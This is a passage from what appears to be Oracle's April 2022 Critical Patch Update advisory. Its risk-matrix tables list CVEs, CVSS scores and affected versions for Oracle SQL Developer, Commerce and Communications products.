| There are no exploitable vulnerabilities for these products. Third party patches for non-exploitable CVEs are noted below. | | | | | | | | | | | | | | | |

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle Secure Backup
  + Oracle Secure Backup (Apache HTTP Server): CVE-2021-44790, CVE-2021-32785, CVE-2021-32786, CVE-2021-32791, CVE-2021-32792 and CVE-2021-44224.
  + Oracle Secure Backup (PHP): CVE-2021-21703.

#### Oracle SQL Developer Risk Matrix

This Critical Patch Update contains 2 new security patches for Oracle SQL Developer.  1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#SQLD)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-44832 | Oracle SQL Developer | Installation (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 21.4.2 |  |
| CVE-2020-13956 | Oracle SQL Developer | Thirdparty Database support (Apache HTTPClient) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | Prior to 21.99 |  |

#### Oracle Commerce Risk Matrix

This Critical Patch Update contains 7 new security patches for Oracle Commerce.  3 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#OCOM)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-39139 | Oracle Commerce Guided Search | Content Acquisition System (XStream) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 11.3.2 |  |
| CVE-2021-22118 | Oracle Commerce Guided Search | Content Acquisition System (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 11.3.2 |  |
| CVE-2021-42340 | Oracle Commerce Guided Search | Content Acquisition System (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 11.3.2 |  |
| CVE-2022-21466 | Oracle Commerce Guided Search | Tools and Frameworks | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 11.3.2 |  |
| CVE-2021-41165 | Oracle Commerce Guided Search | Content Acquisition System (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 11.3.2 |  |
| CVE-2020-13956 | Oracle Commerce Guided Search | Workbench (HTTPClient) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 11.3.2 |  |
| CVE-2020-8908 | Oracle Commerce Guided Search | Workbench (Guava) | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 11.3.2 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-22118 also addresses CVE-2020-5421.
* The patch for CVE-2021-39139 also addresses CVE-2021-39140, CVE-2021-39141, CVE-2021-39144, CVE-2021-39145, CVE-2021-39146, CVE-2021-39147, CVE-2021-39148, CVE-2021-39149, CVE-2021-39150, CVE-2021-39151, CVE-2021-39152, CVE-2021-39153, and CVE-2021-39154.
* The patch for CVE-2021-41165 also addresses CVE-2021-41164.

#### Oracle Communications Applications Risk Matrix

This Critical Patch Update contains 39 new security patches for Oracle Communications Applications.  22 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#CAGBU)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-21431 | Oracle Communications Billing and Revenue Management | Connection Manager | TCP | Yes | 10.0 | Network | Low | None | None | Changed | High | High | High | 12.0.0.4, 12.0.0.5 |  |
| CVE-2022-23305 | Oracle Communications Messaging Server | ISC (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.1 |  |
| CVE-2022-23990 | Oracle Communications MetaSolv Solution | User Interface (LibExpat) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 6.3.1 |  |
| CVE-2022-23305 | Oracle Communications Network Integrity | Cartridge Deployer Tool (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 7.3.6 |  |
| CVE-2022-23305 | Oracle Communications Unified Inventory Management | Logging (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 7.3.4-7.3.5, 7.4.1-7.4.2 |  |
| CVE-2020-13936 | Oracle Communications Network Integrity | TL1 Cartridge (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 7.3.6 |  |
| CVE-2022-21430 | Oracle Communications Billing and Revenue Management | Connection Manager | TCP | No | 8.5 | Network | High | Low | None | Changed | High | High | High | 12.0.0.4, 12.0.0.5 |  |
| CVE-2021-2351 | Oracle Communications Billing and Revenue Management | Pipeline Configuration Center, Oracle Data Manager, Rated Event Loader (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.0.0.4, 12.0.0.5 |  |
| CVE-2022-21424 | Oracle Communications Billing and Revenue Management | Connection Manager | TCP | No | 8.3 | Network | Low | Low | None | Un- changed | High | High | Low | 12.0.0.4 |  |
| CVE-2021-2351 | Oracle Communications IP Service Activator | Service Activator (OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 7.4.0 |  |
| CVE-2021-2351 | Oracle Communications Pricing Design Center | Cloud Native Deployment (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.0.0.4, 12.0.0.5 |  |
| CVE-2021-22118 | Oracle Communications Network Integrity | MSS Cartridge (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 7.3.6 |  |
| CVE-2021-36090 | Oracle Communications Billing and Revenue Management | Billing Care (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.0.0.4 |  |
| CVE-2022-21422 | Oracle Communications Billing and Revenue Management | Connection Manager | TCP | No | 7.5 | Network | High | Low | None | Un- changed | High | High | High | 12.0.0.4, 12.0.0.5 |  |
| CVE-2021-42340 | Oracle Communications Instant Messaging Server | DBPlugin (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 10.0.1.5.0 |  |
| CVE-2021-40690 | Oracle Communications Messaging Server | ISC (Apache Santuario XML Security For Java) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 8.1 |  |
| CVE-2021-33813 | Oracle Communications Messaging Server | ISC (Apache Tika) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.1 |  |
| CVE-2019-10086 | Oracle Communications Network Integrity | User Interface (Apache Commons BeanUtils) | HTTP | Yes | 7.3 | Network | Low | None | None | Un- changed | Low | Low | Low | 7.3.6 |  |
| CVE-2021-44832 | Oracle Communications ASAP | SRP (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 7.3 |  |
| CVE-2021-44832 | Oracle Communications Billing and Revenue Management | Rated Event Manager, Business Operations Center, Kafka Data Manager (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.0.0.4, 12.0.0.5 |  |
| CVE-2021-44832 | Oracle Communications Convergence | Configuration (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 3.0.2.2, 3.0.3.0 |  |
| CVE-2021-44832 | Oracle Communications Convergent Charging Controller | Network Gateway (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 6.0.1.0.0, 12.0.1.0.0-12.0.4.0.0 |  |
| CVE-2021-44832 | Oracle Communications IP Service Activator | Logging (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 7.4.0 |  |
| CVE-2021-44832 | Oracle Communications Messaging Server | ISC (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 8.1 |  |
| CVE-2021-44832 | Oracle Communications Network Charging and Control | Gateway (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 6.0.1.0.0, 12.0.1.0.0-12.0.4.0.0 |  |
| CVE-2021-44832 | Oracle Communications Network Integrity | Cartridge Deployer Tool (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 7.3.6 |  |
| CVE-2021-44832 | Oracle Communications Pricing Design Center | REST Services Manager (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.0.0.4, 12.0.0.5 |  |
| CVE-2021-44832 | Oracle Communications Unified Inventory Management | Logging (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 7.3.5, 7.4.1-7.4.2 |  |
| CVE-2021-43797 | Oracle Communications Messaging Server | ISC (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 8.1 |  |
| CVE-2020-6950 | Oracle Communications Network Integrity | Installer (Eclipse Mojarra) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | High | None | None | 7.3.6 |  |
| CVE-2019-3740 | Oracle Communications Network Integrity | Installer (RSA BSAFE Crypto-J) | HTTPS | Yes | 6.5 | Network | Low | None | Required | Un- changed | High | None | None | 7.3.2, 7.3.5, 7.3.6 |  |
| CVE-2021-36374 | Oracle Communications Order and Service Management | Installer, OSM SDK (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 7.3, 7.4 |  |
| CVE-2022-24329 | Oracle Communications Pricing Design Center | REST Services Manager (Kotlin) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 12.0.0.4, 12.0.0.5 |  |
| CVE-2021-29425 | Oracle Communications Contacts Server | File Upload (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 8.0.0.6.0 |  |
| CVE-2021-29425 | Oracle Communications Design Studio | OSM Plugin (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 7.3.5, 7.4.0-7.4.2 |  |
| CVE-2021-29425 | Oracle Communications Order and Service Management | OSM SDK (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 7.3, 7.4 |  |
| CVE-2021-29425 | Oracle Communications Pricing Design Center | REST Service Manager (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 12.0.0.4, 12.0.0.5 |  |
| CVE-2021-21275 | Oracle Communications Pricing Design Center | REST Service Manager (Jacoco) | HTTP | Yes | 4.3 | Network | Low | None | Required | Un- changed | None | Low | None | 12.0.0.4, 12.0.0.5 |  |
| CVE-2020-8908 | Oracle Communications Pricing Design Center | REST Services Manager (Guava) | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 12.0.0.4, 12.0.0.5 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2019-3740 also addresses CVE-2019-3738, and CVE-2019-3739.
* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516, and CVE-2021-35517.
* The patch for CVE-2021-36374 also addresses CVE-2021-36373.
* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.
* The patch for CVE-2022-23990 also addresses CVE-2022-23852.

#### Oracle Communications Risk Matrix

This Critical Patch Update contains 149 new security patches plus additional third party patches noted below for Oracle Communications.  98 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#CGBU)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-22947 | Oracle Communications Cloud Native Core Network Exposure Function | NEF (Spring Cloud Gateway) | HTTP | Yes | 10.0 | Network | Low | None | None | Changed | High | High | High | 22.1.0 |  |
| CVE-2022-22947 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (Spring Cloud Gateway) | HTTP | Yes | 10.0 | Network | Low | None | None | Changed | High | High | High | 22.1.0, 1.8.0 |  |
| CVE-2017-1000353 | Oracle Communications Cloud Native Core Automated Test Suite | Automated Test Suite (Jenkins) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.9.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Automated Test Suite | Automation Test Suite (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.9.0, 22.1.0 |  |
| CVE-2021-29921 | Oracle Communications Cloud Native Core Binding Support Function | BSF (Python) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.11.0 |  |
| CVE-2021-43527 | Oracle Communications Cloud Native Core Binding Support Function | BSF (NSS) | HTTPS | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.11.0 |  |
| CVE-2022-23221 | Oracle Communications Cloud Native Core Console | CNC Console (H2) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.9.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Console | CNC Console (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.9.0, 22.1.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Network Exposure Function | NEF (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 22.1.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | DB Tier (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.10.0, 22.1.0 |  |
| CVE-2020-14343 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | OC-CNE (PyYAML) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.10.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Network Repository Function | OCNRF (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.15.0, 22.1.0 |  |
| CVE-2021-43527 | Oracle Communications Cloud Native Core Network Repository Function | OCNRF (NSS) | HTTPS | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.15.0, 1.15.1 |  |
| CVE-2021-29921 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (Python) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.8.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 22.1.0, 1.8.0 |  |
| CVE-2021-43527 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (NSS) | HTTPS | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.8.0 |  |
| CVE-2021-42392 | Oracle Communications Cloud Native Core Policy | Policy (H2) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.15.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Policy | Policy (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.15.0, 22.1.0 |  |
| CVE-2021-35574 | Oracle Communications Cloud Native Core Policy | Policy (glibc) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.15.0 |  |
| CVE-2021-3520 | Oracle Communications Cloud Native Core Policy | Policy (lz4) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | OC SEPP (Spring framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.7.0, 22.1.0 |  |
| CVE-2022-22965 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 1.15.0, 22.1.0 |  |
| CVE-2020-17530 | Oracle Communications Diameter Intelligence Hub | Visualization (Apache Struts) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.0.0-8.1.0, 8.2.0-8.2.3 |  |
| CVE-2022-23305 | Oracle Communications EAGLE FTP Table Base Retrieval | Core (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 4.5 |  |
| CVE-2020-35198 | Oracle Communications EAGLE Software | Measurements (VxWorks) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 46.7.0, 46.8.0-46.8.2, 46.9.1-46.9.3 |  |
| CVE-2021-44790 | Oracle Communications Element Manager | Security (Apache HTTP Server) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 9.0 |  |
| CVE-2021-44790 | Oracle Communications Operations Monitor | Mediation Engine (Apache HTTP Server) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 4.3, 4.4, 5.0 |  |
| CVE-2022-22965 | Oracle Communications Policy Management | CMP (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.6.0.0.0 |  |
| CVE-2021-23450 | Oracle Communications Policy Management | CMP (dojo) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.6.0.0.0 |  |
| CVE-2021-43527 | Oracle Communications Policy Management | CMP (NSS) | HTTPS | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.6.0.0.0 |  |
| CVE-2021-44790 | Oracle Communications Session Report Manager | General (Apache HTTP Server) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 9.0 |  |
| CVE-2021-44790 | Oracle Communications Session Route Manager | Third Party (Apache HTTP Server) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 9.0 |  |
| CVE-2022-22965 | Oracle SD-WAN Edge | Management (Spring Framework) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 9.0, 9.1 |  |
| CVE-2020-36242 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | OC-CNE (python-cryptography) | HTTP | Yes | 9.1 | Network | Low | None | None | Un- changed | High | None | High | 1.10.0 |  |
| CVE-2021-3518 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | OC-CNE (libxml2) | HTTP | Yes | 8.8 | Network | Low | None | Required | Un- changed | High | High | High | 1.10.0 |  |
| CVE-2021-32626 | Oracle Communications Operations Monitor | FDP (Redis) | TCP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 4.3, 4.4, 5.0 |  |
| CVE-2020-10878 | Oracle Communications EAGLE LNP Application Processor | Platform (Perl) | HTTP | Yes | 8.6 | Network | Low | None | None | Un- changed | Low | Low | High | 10.1, 10.2 |  |
| CVE-2020-10878 | Oracle Communications Performance Intelligence Center (PIC) Software | Platform (Perl) | HTTP | Yes | 8.6 | Network | Low | None | None | Un- changed | Low | Low | High | 10.3.0.0.0-10.3.0.2.1, 10.4.0.1.0-10.4.0.3.1 |  |
| CVE-2021-39153 | Oracle Communications Cloud Native Core Automated Test Suite | Automated Test Suite Framework (XStream) | HTTP | No | 8.5 | Network | High | Low | None | Changed | High | High | High | 1.9.0 |  |
| CVE-2021-2351 | Oracle Communications Diameter Intelligence Hub | Integrated DIH (JDBC, OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.0-8.2.3 |  |
| CVE-2021-2351 | Oracle Communications Services Gatekeeper | Third party software/products (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 7.0.0.0.0 |  |
| CVE-2019-16789 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | OC-CNE (ceph) | HTTP | Yes | 8.2 | Network | Low | None | None | Un- changed | Low | High | None | 1.10.0 |  |
| CVE-2019-18276 | Oracle Communications Cloud Native Core Policy | Policy (GNU Bash) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 1.14.0 |  |
| CVE-2021-22118 | Oracle Communications Diameter Intelligence Hub | Visualization, Mediation (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 8.0.0-8.1.0, 8.2.0-8.2.3 |  |
| CVE-2021-3156 | Oracle Communications Performance Intelligence Center (PIC) Software | Platform (Sudo) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 10.3.0.0.0-10.3.0.2.1, 10.4.0.1.0-10.4.0.3.1 |  |
| CVE-2021-42340 | Management Cloud Engine | Security (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to 1.5.0 |  |
| CVE-2021-35515 | Oracle Communications Cloud Native Core Automated Test Suite | Automated Test Suite (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.8.0 |  |
| CVE-2021-22946 | Oracle Communications Cloud Native Core Binding Support Function | CNC BSF (cURL) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.11.0 |  |
| CVE-2020-36518 | Oracle Communications Cloud Native Core Console | CNC Console (jackson-databind) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.9.0 |  |
| CVE-2021-22946 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | OC-CNE (cURL) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.10.0 |  |
| CVE-2021-22946 | Oracle Communications Cloud Native Core Network Repository Function | OCNRF (cURL) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.15.0, 1.15.1 |  |
| CVE-2021-3690 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (Undertow) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.8.0 |  |
| CVE-2021-22946 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (cURL) | HTTPS | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.8.0 |  |
| CVE-2020-28196 | Oracle Communications Cloud Native Core Policy | Policy (MIT Kerberos) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-3807 | Oracle Communications Cloud Native Core Policy | Policy (ansi-regex) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.15.0 |  |
| CVE-2020-8231 | Oracle Communications Cloud Native Core Policy | Policy (libcurl) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.14.0 |  |
| CVE-2020-29363 | Oracle Communications Cloud Native Core Policy | Policy (p11-kit) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-42340 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.15.0 |  |
| CVE-2021-22946 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (cURL) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.15.0 |  |
| CVE-2021-36090 | Oracle Communications Diameter Intelligence Hub | Integrated DIH (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.0-8.2.3 |  |
| CVE-2020-11971 | Oracle Communications Diameter Intelligence Hub | Mediation (Apache Camel) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 8.0.0-8.1.0, 8.2.0-8.2.3 |  |
| CVE-2021-43859 | Oracle Communications Diameter Intelligence Hub | Visualization, Database (XStream) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.0-8.1.0, 8.2.0-8.2.3 |  |
| CVE-2021-30468 | Oracle Communications Diameter Intelligence Hub | Visualization, Mediation (Apache CXF) | SOAP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.0-8.1.0, 8.2.0-8.2.3 |  |
| CVE-2021-42340 | Oracle Communications Element Manager | Security (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to 9.0 |  |
| CVE-2021-43859 | Oracle Communications Policy Management | CMP (XStream) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.6.0.0.0 |  |
| CVE-2021-42340 | Oracle Communications Session Report Manager | General (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to 9.0 |  |
| CVE-2021-42340 | Oracle Communications Session Route Manager | Third Party (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to 9.0 |  |
| CVE-2020-25638 | Oracle Communications Cloud Native Core Console | CNC Console (hibernate-core) | HTTP | Yes | 7.4 | Network | High | None | None | Un- changed | High | High | None | 1.9.0 |  |
| CVE-2021-3712 | Oracle Communications Cloud Native Core Console | CNC Console (OpenSSL) | HTTPS | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 1.9.0 |  |
| CVE-2021-3712 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (OpenSSL) | HTTP | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 1.7.0 |  |
| CVE-2021-3712 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (OpenSSL) | HTTPS | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 1.15.0 |  |
| CVE-2021-3712 | Oracle Communications Session Border Controller | Security (OpenSSL) | TLS | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 8.4, 9.0 |  |
| CVE-2021-3712 | Oracle Communications Unified Session Manager | Security (OpenSSL) | TLS | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 8.2.5, 8.4.5 |  |
| CVE-2021-3712 | Oracle Enterprise Communications Broker | Security (OpenSSL) | TLS | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 3.2, 3.3 |  |
| CVE-2021-3712 | Oracle Enterprise Session Border Controller | Security (OpenSSL) | TLS | Yes | 7.4 | Network | High | None | None | Un- changed | High | None | High | 8.4, 9.0 |  |
| CVE-2022-23181 | Oracle Communications Cloud Native Core Policy | Policy (Apache Tomcat) | None | No | 7.0 | Local | High | Low | None | Un- changed | High | High | High | 1.15.0 |  |
| CVE-2021-44832 | Management Cloud Engine | Security (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.5.0 |  |
| CVE-2021-44832 | Oracle Communications Cloud Native Core Console | CNC Console (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.9.0 |  |
| CVE-2021-44832 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | DBTier (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.10.0 |  |
| CVE-2021-44832 | Oracle Communications Cloud Native Core Network Repository Function | OCNRF (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.15.0, 1.15.1 |  |
| CVE-2021-44832 | Oracle Communications Cloud Native Core Network Slice Selection Function | NSSF (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.8.0 |  |
| CVE-2021-44832 | Oracle Communications Cloud Native Core Policy | Policy (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.15.0 |  |
| CVE-2021-44832 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.7.0 |  |
| CVE-2021-44832 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.15.0 |  |
| CVE-2021-44832 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.15.0 |  |
